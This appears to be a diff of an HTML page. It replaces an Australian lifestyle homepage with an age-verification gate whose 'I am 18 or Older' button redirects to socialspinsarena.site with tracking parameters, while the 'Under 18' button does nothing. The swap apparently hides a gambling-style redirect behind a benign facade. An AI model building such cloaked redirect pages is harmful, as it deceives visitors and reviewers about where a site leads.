@@ -1,107 +1,190 @@
-    <!DOCTYPE html>
-    <html lang="en-AU">
-    <head>
-    <meta charset="UTF-8">
-    <title>LifeInAUS – Your Guide to Living Better in Australia</title>
-    <meta name="description" content="LifeInAUS shares practical guides on saving money, cost of living and affordable travel across Australia.">
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>    
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    </head>
-    <body>
+    <title>Age Verification</title>
+      <style>   
+        /* Reset some basic styles */
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            height: 100%;
+            overflow-x: hidden;
+        }
 
-    <header class="main-header">
-    <div class="container">
-        <div class="brand">LifeInAUS</div>
-        <nav>
-        <a href="index.html">Home</a>
-        <a href="living-cost-australia.html">Living Costs</a>
-        <a href="money-saving-tips.html">Money Tips</a>
-        <a href="weekend-getaways.html">Trips</a>
-        <a href="road-trips.html">Road Trips</a>
-        <a href="australia-guides.html">Guides</a>
-        </nav>
-    </div>
-    </header>
+        /* Background sections */
+        .background-section {
+            height: 100vh; /* Full viewport height */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
 
-    <section class="hero-area">
-    <div class="hero-box">
-        <h1>Real Life. Real Australia.</h1>
-        <p>Smarter living, honest budgeting and unforgettable weekend adventures.</p>
-        <a href="living-cost-australia.html" class="btn-primary">Explore Life in AUS</a>
-    </div>
-    </section>
+        /* Overlay for background sections */
+        .background-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5); /* Dark overlay */
+            z-index: 1;
+        }
+        /* Container for the age verification page, fixed in place */
+       
+  /* Overlay background */
+  .age-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(232, 225, 225, 0.9);
+    backdrop-filter: blur(10px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 99999;
+  }
+ 
+  /* Popup box */
+  .age-popup {
+    background: #fff;
+    padding: 30px;
+    border-radius: 10px;
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0px 4px 10px rgba(0,0,0,0.3);
+  }
+ 
+  .age-popup h2 {
+    margin-bottom: 15px;
+    font-size: 22px;
+    font-weight: bold;
+  }
+ 
+  .age-popup p {
+    margin-bottom: 20px;
+    font-size: 16px;
+    color: #444;
+  }
+ 
+  .age-buttons button {
+    margin: 5px;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 15px;
+    font-weight: bold;
+    background-color: #007b8f;
+    color: white;
+    transition: background 0.3s;
+  }
+ 
+  .age-buttons button:hover {
+    background-color: #005f6a;
+  }
 
-    <section class="card-section">
-    <div class="card">
-        <h2>Living Cost Guides</h2>
-        <p>City-by-city breakdown of rent, groceries and daily expenses.</p>
-    </div>
 
-    <div class="card">
-        <h2>Money Saving Plans</h2>
-        <p>Proven habits Australians use to save thousands every year.</p>
-    </div>
+        .logo {
+            max-width: 150px;
+            margin-bottom: 5px;
+        }
 
-    <div class="card">
-        <h2>Weekend Escapes</h2>
-        <p>Beach towns, national parks and hidden destinations.</p>
-    </div>
+        .content h1 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #000;
+        }
 
-    <div class="card">
-        <h2>Road Trip Stories</h2>
-        <p>Scenic routes, fuel tips and must-see travel paths.</p>
-    </div>
-    </section>
+        .content p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            color: #000;
+        }
 
-    <section class="editor-picks">
-    <h2>Editor’s Picks This Month</h2>
-    <div class="pick-grid">
-        <div class="pick">
-        <h3>Best Cities to Live on a Budget</h3>
-        <p>Discover Australian cities where rent, transport and groceries stay affordable.</p>
-        </div>
-        <div class="pick">
-        <h3>Hidden Weekend Retreats</h3>
-        <p>Quiet coastal towns and forest cabins perfect for short escapes.</p>
-        </div>
-        <div class="pick">
-        <h3>Simple Money Habits</h3>
-        <p>Daily actions that silently grow your savings without sacrifice.</p>
-        </div>
-    </div>
-    </section>
+        .buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
 
+        .btn {
+            background-color: #0081a1;
+            color: rgb(255, 255, 255);
+            padding: 10px 20px;
+            text-decoration: none;
+            font-size: 1.3rem;
+            font-weight: 700;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
 
-    <section class="feature-strip">
-    <h2>Why Australians Love LifeInAUS</h2>
-    <p>We keep things simple — no fake promises, only practical living advice.</p>
-    </section>
+        .btn:hover {
+            background-color: #0b00a1;
+        }
 
-    <section class="subscribe-strip">
-    <h2>Join 10,000+ Australians Living Smarter</h2>
-    <p>Weekly tips on saving money and travelling better.</p>
-    <form class="sub-form">
-        <input type="email" placeholder="Your email address" required>
-        <button type="submit">Subscribe</button>
-    </form>
-    </section>
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+            width: 100%;
+        }
 
+        footer a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
 
-    <footer class="footer-area">
-    <p>© 2025 LifeInAUS – Australian Living Simplified</p>
-    <div class="footer-links">
-        <a href="privacy.html">Privacy</a>
-        <a href="terms.html">Terms</a>
-    </div>
-    </footer>
-<!-- Age Verification Popup -->
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive styling */
+        @media (max-width: 480px) {
+            .age-verification-container {
+                width: 300px;
+                height: 300px;
+            }
+
+            .logo {
+                max-width: 100px;
+            }
+
+            .content h1 {
+                font-size: 15px;
+            }
+
+            .content p {
+                font-size: 0.9rem;
+            }
+
+            .btn {
+                padding: 8px 15px;
+                font-size: 0.9rem;
+            }
+              
+        }
+    </style>
+</head>
+<body cz-shortcut-listen="true">
+    <!-- Fixed age verification container -->
+   <!-- Age Verification Popup -->
 <div id="age-verification" class="age-overlay">
   <div class="age-popup">
-    <h2>Important Notice</h2>
-    <p>This website is intended for informational and promotional purposes only. By continuing, you agree to our Terms of Use and Privacy Policy..</p>
+    <h2>Age Verification</h2>
+    <p>You must be 18 or older to enter this site.</p>
     <div class="age-buttons">
-      <button id="btn-yes">Continue</button>
-      <button id="btn-no">No</button>
+      <button id="btn-yes">I am 18 or Older</button>
+      <button id="btn-no">I am Under 18</button>
     </div>
   </div>
 </div>
@@ -112,8 +195,8 @@
     var noBtn = document.getElementById("btn-no");
  
     // Change these URLs as you want
-    var yesLink = "/home/";  
-    var noLink = "/home/";  
+    var yesLink = "http://socialspinsarena.site/?utm_campaign=QcLw1ARn25&v1=[v1]&v2=[v2]&v3=[v3]";  
+    var noLink = "#";  
  
     yesBtn.addEventListener("click", function () {
       window.location.href = yesLink;
@@ -125,7 +208,12 @@
   });
 </script>
 
-    </body>
-    </html>
+    <!-- First background section -->
+    <div id="section1" class="background-section"></div>
 
+    <!-- Second background section -->
+    <div id="section2" class="background-section"></div>
 
+    <!-- Third background section -->
+    <div id="section3" class="background-section"></div>
+</body></html>
